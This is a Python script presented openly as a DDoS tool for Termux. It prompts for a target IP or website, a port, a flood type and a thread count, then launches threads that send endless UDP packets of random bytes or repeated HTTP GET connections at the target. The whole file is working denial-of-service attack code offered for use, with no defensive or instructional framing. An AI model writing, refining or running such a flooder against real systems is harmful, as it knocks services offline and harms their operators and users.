# -*- coding: utf-8 -*-
import os
import socket
import threading
import random
import time

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Banner Function
def banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(f"""{RED}
▐▄• ▄       ▐▄• ▄ 
 █▌█▌▪▪      █▌█▌▪
 ·██·  ▄█▀▄  ·██· 
▪▐█·█▌▐█▌.▐▌▪▐█·█▌
•▀▀ ▀▀ ▀█▄▀▪•▀▀ ▀▀
{CYAN}DDoS Tool for Termux (Optimized){RESET}
""")
banner()

# User Input with Validation
try:
    target = input(f"{YELLOW}[+] Target IP/Website: {RESET}").strip()
    port = int(input(f"{YELLOW}[+] Target Port: {RESET}").strip())

    attack_type = input(f"{YELLOW}[+] Attack Type (UDP/HTTP): {RESET}").strip().lower()
    if attack_type not in ["udp", "http"]:
        print(f"{RED}❌ Invalid Attack Type! Use 'UDP' or 'HTTP'.{RESET}")
        exit()

    thread_count = int(input(f"{YELLOW}[+] Number of Threads: {RESET}").strip())
    if thread_count <= 0:
        print(f"{RED}❌ Invalid thread count! Must be greater than 0.{RESET}")
        exit()

except ValueError:
    print(f"{RED}❌ Invalid input! Please enter correct values.{RESET}")
    exit()

# UDP Attack Function
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)
    while True:
        try:
            sock.sendto(bytes_data, (target, port))
            print(f"{GREEN}[UDP] Attacking {target}:{port}{RESET}")
            time.sleep(0.1)  # Prevent CPU Overload
        except KeyboardInterrupt:
            print(f"{RED}\n[!] Attack Stopped!{RESET}")
            sock.close()
            break
        except Exception as e:
            print(f"{RED}Error: {e}{RESET}")

# HTTP Attack Function
def http_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
            s.close()
            print(f"{BLUE}[HTTP] Attacking {target}:{port}{RESET}")
            time.sleep(0.1)  # Prevent CPU Overload
        except KeyboardInterrupt:
            print(f"{RED}\n[!] Attack Stopped!{RESET}")
            break
        except Exception as e:
            print(f"{RED}Error: {e}{RESET}")

# Start Attack
try:
    for _ in range(thread_count):
        if attack_type == "udp":
            threading.Thread(target=udp_flood, daemon=True).start()
        elif attack_type == "http":
            threading.Thread(target=http_flood, daemon=True).start()
    while True:
        time.sleep(1)  # Keep the script running
except KeyboardInterrupt:
    print(f"\n{RED}[!] Attack Stopped by User!{RESET}")